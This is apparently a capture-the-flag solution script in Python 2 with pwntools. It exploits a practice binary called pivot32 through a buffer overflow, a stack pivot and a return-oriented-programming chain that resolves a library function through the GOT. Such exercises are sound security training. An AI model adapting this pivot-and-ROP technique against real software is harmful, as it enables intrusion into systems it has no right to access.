from pwn import *

foothold_function = 0x80485f0
foothold_function_got = 0x804a024
foothold_offset = 0x770
ret2win_effective_offset = 0x967 - foothold_offset

# pop eax; ret;
gadget1 = 0x080488c0
# xchg esp,eax; ret;
gadget2 = 0x080488c2
# mov eax,QWORD PTR [eax]; ret;
gadget3 = 0x080488c4
# add eax,ebx; ret;
gadget4 = 0x080488c7
# call eax;
gadget5 = 0x080486a3
# pop ebx; ret;
gadget6 = 0x08048571

rop_chain = ''
rop_chain += p32(foothold_function)

rop_chain += p32(gadget1)
rop_chain += p32(foothold_function_got)

rop_chain += p32(gadget3)

rop_chain += p32(gadget6)
rop_chain += p32(ret2win_effective_offset)

rop_chain += p32(gadget4)

rop_chain += p32(gadget5)

p = process('./pivot32')

p.recvuntil('pivot: ')
pivot = int(p.recvuntil('\n'), 16)

p.sendline(rop_chain)

payload = 'a' * 44

payload += p32(gadget1)
payload += p32(pivot)

payload += p32(gadget2)

p.sendline(payload)
print p.recvall()
